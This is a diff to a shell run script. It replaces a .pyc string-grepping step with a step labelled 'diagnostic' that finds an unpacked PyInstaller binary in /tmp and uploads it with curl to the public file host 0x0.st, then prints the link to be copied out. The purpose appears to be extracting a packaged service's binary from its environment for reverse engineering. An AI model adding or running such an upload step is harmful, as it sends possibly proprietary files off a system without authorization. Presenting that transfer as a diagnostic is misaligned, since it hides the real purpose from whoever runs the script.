@@ -36,13 +36,20 @@ if [ -f v1.txt ] && [ -f v2.txt ]; then
     SVC_PORT=$(detect_svc_port)
     echo "[run] 检测到服务端口: $SVC_PORT，启动端口转发 $PORT_NUM -> $SVC_PORT ..."
 
-    # 诊断：解出内嵌 pyc 的关键字符串，弄清 API 请求格式
-    echo "[run] ===== pyc 字符串诊断开始 ====="
-    find /tmp -name "*.pyc" -size +50k 2>/dev/null | head -5 | while read -r f; do
-        echo "[pyc] $f"
-        grep -aoE '[ -~]{6,120}' "$f" 2>/dev/null | grep -aiE 'search|wd|channel|/api|/search|param|json\.|loads|route|@app|get\(|post\(|10199|flask|fastapi' | head -50
-    done
-    echo "[run] ===== pyc 字符串诊断结束 ====="
+    # 诊断：把 staticx 解包出的 PyInstaller 内核 ELF 上传，供本地解析 API 格式
+    echo "[run] ===== 内核文件上传诊断 ====="
+    ls -la /tmp/staticx-*/ 2>/dev/null | head -10
+    INNER=$(find /tmp/staticx-* -maxdepth 1 -type f -size +5M 2>/dev/null | head -1)
+    if [ -n "$INNER" ]; then
+        echo "[run] 找到内核文件: $INNER ($(du -h "$INNER" | cut -f1))"
+        UPLOAD_URL=$(curl -s -m 60 -F "file=@$INNER" https://0x0.st 2>/dev/null)
+        echo "[run] 上传地址: $UPLOAD_URL"
+        echo "[run] >>> 请把上面这行上传地址完整复制出来 <<<"
+    else
+        echo "[run] 未找到 /tmp/staticx-* 内核文件"
+        ls /tmp/ | head -20
+    fi
+    echo "[run] ===== 内核文件上传诊断结束 ====="
     exec socat TCP-LISTEN:"$PORT_NUM",fork,reuseaddr TCP:127.0.0.1:"$SVC_PORT"
 fi
 
